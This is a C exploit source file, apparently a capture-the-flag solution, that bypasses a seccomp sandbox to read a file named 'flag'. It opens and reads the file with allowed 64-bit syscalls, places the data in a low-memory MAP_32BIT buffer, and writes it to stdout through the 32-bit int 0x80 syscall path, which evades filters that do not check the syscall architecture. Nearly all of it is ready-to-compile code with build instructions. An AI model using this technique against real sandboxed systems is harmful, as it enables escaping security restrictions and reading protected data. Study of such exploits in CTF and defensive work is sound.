// sploit3.c
// This exploit uses 64-bit syscalls to open/read the flag file,
// allocates a buffer in low (32-bit) memory using MAP_32BIT,
// and then uses a 64-bit inline assembly routine to perform a 32-bit write syscall via int 0x80.
// The idea is to force our arguments (fd, buffer pointer, count) into 32-bit values
// so that the legacy int 0x80 write (syscall number 4) sees the correct parameters.
// Compile with:
//    gcc -m64 -static -O2 -o sploit3 sploit3.c
// (Ensure your kernel supports IA-32 emulation.)

#include <sys/mman.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef MAP_32BIT
#define MAP_32BIT 0x40
#endif

#ifndef AT_FDCWD
#define AT_FDCWD -100
#endif

// 64-bit syscall wrapper
static inline long sys64(long num, long a1, long a2, long a3,
                         long a4, long a5, long a6) {
    register long r10 asm("r10") = a4;
    register long r8  asm("r8")  = a5;
    register long r9  asm("r9")  = a6;
    long ret;
    __asm__ volatile (
         "syscall"
         : "=a"(ret)
         : "a"(num), "D"(a1), "S"(a2), "d"(a3),
           "r"(r10), "r"(r8), "r"(r9)
         : "rcx", "r11", "memory"
    );
    return ret;
}

// 32-bit write via int 0x80 using inline assembly in our 64-bit code.
// We cast our arguments to 32-bit values so that the int 0x80 handler sees the correct numbers.
static inline int write32(int fd, const void *buf, int count) {
    int ret;
    int fd32 = (int) fd;
    int buf32 = (int) buf; // buffer was allocated in MAP_32BIT so it fits in 32 bits.
    __asm__ volatile (
        "movl %1, %%ebx\n\t"   // put fd into ebx
        "movl %2, %%ecx\n\t"   // put buffer pointer into ecx
        "movl %3, %%edx\n\t"   // put count into edx
        "movl $4, %%eax\n\t"   // syscall number for write (32-bit)
        "int $0x80\n\t"
        "movl %%eax, %0\n\t"
        : "=r" (ret)
        : "r" (fd32), "r" (buf32), "r" (count)
        : "eax", "ebx", "ecx", "edx"
    );
    return ret;
}

// Our _start entry point (bypassing libc)
void _start(void) {
    // Allocate buffer in the low 32-bit address space.
    char *buffer = (char *) sys64(SYS_mmap, 0, 0x1000,
                                  PROT_READ | PROT_WRITE,
                                  MAP_PRIVATE | MAP_ANONYMOUS | MAP_32BIT,
                                  -1, 0);
    if ((long)buffer == -1) {
        sys64(SYS_exit_group, 1, 0, 0, 0, 0, 0);
    }

    // Open the flag file using openat (allowed 64-bit syscall).
    int fd = sys64(SYS_openat, AT_FDCWD, (long)"flag", O_RDONLY, 0, 0, 0);
    if (fd < 0) {
        sys64(SYS_exit_group, 1, 0, 0, 0, 0, 0);
    }

    // Read the flag into the allocated buffer.
    ssize_t bytes = sys64(SYS_read, fd, (long)buffer, 0x1000, 0, 0, 0);
    if (bytes < 0) {
        sys64(SYS_exit_group, 1, 0, 0, 0, 0, 0);
    }
    sys64(SYS_close, fd, 0, 0, 0, 0, 0);

    // Now use our 32-bit write (via int 0x80) to output the flag to stdout (fd 1).
    // We expect that this 32-bit write is allowed by the seccomp filter.
    write32(1, buffer, bytes);

    sys64(SYS_exit_group, 0, 0, 0, 0, 0, 0);
}
